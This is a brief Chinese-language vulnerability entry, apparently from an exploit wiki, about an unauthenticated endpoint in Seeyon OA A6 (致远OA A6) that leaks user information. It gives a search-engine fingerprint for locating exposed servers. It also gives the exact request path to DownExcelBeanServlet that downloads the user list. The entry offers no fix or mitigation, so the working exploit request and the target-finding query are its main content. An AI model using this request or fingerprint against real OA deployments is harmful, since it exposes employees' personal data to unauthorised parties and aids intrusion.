# 致远OA A6 DownExcelBeanServlet 用户敏感信息泄露

## 漏洞描述

致远OA A6 存在某个未授权的接口导致任意访问者可下载OA中的用户信息

## 漏洞影响

<a-checkbox checked>致远OA A6</a-checkbox></br>

## 网络测绘

<a-checkbox checked>title="致远A8+协同管理软件.A6"</a-checkbox></br>

## 漏洞复现

访问如下URL即可跳转下载用户信息文件

```plain
/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0
```



![img](/assets/PeiQi-Wiki/img/zhiyuan-18.png)